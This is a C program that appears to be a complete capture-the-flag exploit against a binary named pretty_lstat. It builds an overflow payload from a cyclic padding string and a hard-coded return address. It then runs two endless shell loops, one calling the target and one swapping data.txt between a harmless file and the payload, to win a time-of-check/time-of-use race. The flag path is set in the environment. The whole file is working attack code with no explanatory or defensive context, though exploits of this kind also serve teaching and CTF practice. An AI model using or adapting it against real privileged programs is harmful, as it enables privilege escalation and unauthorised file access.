#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>

pid_t child1 = -1;
pid_t child2 = -1;

void handle_sigint(int sig) {
    // Terminate child processes
    if (child1 > 0) {
        kill(child1, SIGTERM);
    }
    if (child2 > 0) {
        kill(child2, SIGTERM);
    }
    // Wait for child processes to exit
    wait(NULL);
    wait(NULL);
    printf("\nTerminated child processes. Exiting program.\n");
    exit(0);
}

void create_file(const char *filename, const char *content) {
    FILE *file = fopen(filename, "w");
    if (!file) {
        perror("Error creating file");
        exit(EXIT_FAILURE);
    }
    fprintf(file, "%s", content);
    fclose(file);
}

int main() {
    // Set up signal handler for SIGINT
    signal(SIGINT, handle_sigint);

    // Set the environment variable FLAG_PATH to ../flag
    if (setenv("FLAG_PATH", "../../flag", 1) != 0) {
        perror("Error setting FLAG_PATH environment variable");
        exit(EXIT_FAILURE);
    }
    // Step 1: Create hello.txt and data.txt with "hello"
    create_file("hello.txt", "hello");
    create_file("data.txt", "hello");

    // Step 2: Create exploit.txt with the exploit string
    const char *exploit_content = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa";
    create_file("exploit.txt", exploit_content);

    // Step 3: Append the binary sequence to exploit.txt
    FILE *exploit_file = fopen("exploit.txt", "ab");
    if (!exploit_file) {
        perror("Error opening exploit.txt for appending");
        exit(EXIT_FAILURE);
    }
    unsigned char binary_data[] = {0x96, 0x12, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00};
    fwrite(binary_data, sizeof(binary_data), 1, exploit_file);
    fclose(exploit_file);

    // Step 4: Execute the while loops as shell commands
    printf("Files created successfully. Starting shell commands...\n");

    child1 = fork();
    if (child1 == 0) {
        // Child process for the first while loop
        execl("/bin/bash", "/bin/bash", "-c",
              "while true; do ./pretty_lstat data.txt data.txt data.txt; done",
              (char *)NULL);
        perror("Error starting first while loop");
        exit(EXIT_FAILURE);
    }

    child2 = fork();
    if (child2 == 0) {
        // Child process for the second while loop
        execl("/bin/bash", "/bin/bash", "-c",
              "while true; do cp hello.txt data.txt; cp exploit.txt data.txt; done",
              (char *)NULL);
        perror("Error starting second while loop");
        exit(EXIT_FAILURE);
    }

    // Parent process waits for signal
    while (1) {
        pause(); // Wait for signals
    }

    return 0;
}